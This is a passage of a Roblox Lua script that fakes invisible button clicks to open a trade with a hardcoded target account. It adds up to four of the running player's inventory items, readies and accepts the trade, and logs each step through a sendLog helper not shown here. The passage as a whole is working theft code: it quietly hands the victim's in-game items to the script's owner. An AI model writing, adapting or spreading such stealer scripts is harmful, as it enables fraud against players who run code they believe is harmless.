-- ============================================
-- SIMULATE CLICKS (Invisible)
-- ============================================

local function clickGUI(element)
    if not element then return false end
    pcall(function()
        element:Fire("MouseButton1Click")
        element:Fire("Activated")
        element:Fire("MouseButton1Down")
        element:Fire("MouseButton1Up")
        
        local pos = element.AbsolutePosition
        local size = element.AbsoluteSize
        if pos and size then
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
            wait(0.05)
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
        end
    end)
    return true
end

-- ============================================
-- TRADE FUNCTIONS
-- ============================================

local function openTradeWithTarget()
    pcall(function()
        local playerGui = player.PlayerGui
        
        -- Find player list
        local playerList = nil
        for _, gui in pairs(playerGui:GetChildren()) do
            if gui.Name:lower():find("player") or gui.Name:lower():find("leaderboard") or gui.Name:lower():find("list") then
                playerList = gui
                break
            end
        end
        
        if playerList then
            for _, playerFrame in pairs(playerList:GetDescendants()) do
                if playerFrame:IsA("TextLabel") and playerFrame.Text == TARGET_USER then
                    clickGUI(playerFrame)
                    wait(0.5)
                    
                    for _, btn in pairs(playerGui:GetDescendants()) do
                        if btn:IsA("TextButton") and (btn.Text:lower():find("trade") or btn.Name:lower():find("trade")) then
                            clickGUI(btn)
                            sendLog("📤 Trade request sent to " .. TARGET_USER)
                            return true
                        end
                    end
                end
            end
        end
    end)
    return false
end

local function acceptTradeRequest()
    pcall(function()
        local playerGui = player.PlayerGui
        for _, btn in pairs(playerGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local btnText = (btn.Text or ""):lower()
                if btnText:find("accept") or btnText:find("confirm") then
                    clickGUI(btn)
                    sendLog("✅ Accepted trade request")
                    return true
                end
            end
        end
    end)
    return false
end

local function addItemsToTrade(items, maxItems)
    local added = 0
    
    for i = 1, math.min(maxItems, #items) do
        local item = items[i]
        if item.frame then
            clickGUI(item.frame)
            added = added + 1
            sendLog("➕ Added: " .. item.name)
            print("  Added to trade: " .. item.name)
        end
        wait(0.3)
    end
    
    return added
end

local function readyTrade()
    pcall(function()
        local playerGui = player.PlayerGui
        for _, btn in pairs(playerGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local btnText = (btn.Text or ""):lower()
                if btnText:find("ready") or btnText:find("confirm") then
                    clickGUI(btn)
                    sendLog("✅ Ready up")
                    return true
                end
            end
        end
    end)
    return false
end

local function finalAccept()
    pcall(function()
        local playerGui = player.PlayerGui
        for _, btn in pairs(playerGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local btnText = (btn.Text or ""):lower()
                if (btnText:find("accept") or btnText:find("confirm")) and btn.Visible then
                    clickGUI(btn)
                    sendLog("🎉 Trade completed")
                    return true
                end
            end
        end
    end)
    return false
end

-- ============================================
-- MAIN TRADE SEQUENCE
-- ============================================

local tradeInProgress = false

local function startAutoTrade()
    if tradeInProgress then
        sendLog("Trade already in progress")
        return
    end
    tradeInProgress = true
    
    -- First, display all items
    local items = displayAllItems()
    
    if #items == 0 then
        print("❌ Cannot trade - no items found!")
        sendLog("❌ Trade cancelled - no items in inventory")
        tradeInProgress = false
        return
    end
    
    print("\n🔄 Starting auto trade with " .. TARGET_USER)
    sendLog("🔄 Starting auto trade with " .. TARGET_USER)
    
    -- Open trade
    local opened = openTradeWithTarget()
    if not opened then
        print("❌ Could not open trade with " .. TARGET_USER)
        sendLog("❌ Could not open trade")
        tradeInProgress = false
        return
    end
    
    wait(2)
    acceptTradeRequest()
    wait(2)
    
    -- Add items
    local itemsAdded = addItemsToTrade(items, 4)
    print("📦 Added " .. itemsAdded .. " items to trade")
    sendLog("📦 Added " .. itemsAdded .. " items to trade")
    wait(1)
    
    -- Complete trade
    readyTrade()
    wait(1)
    finalAccept()
    
    print("✅ Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    sendLog("✅ Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    tradeInProgress = false
end

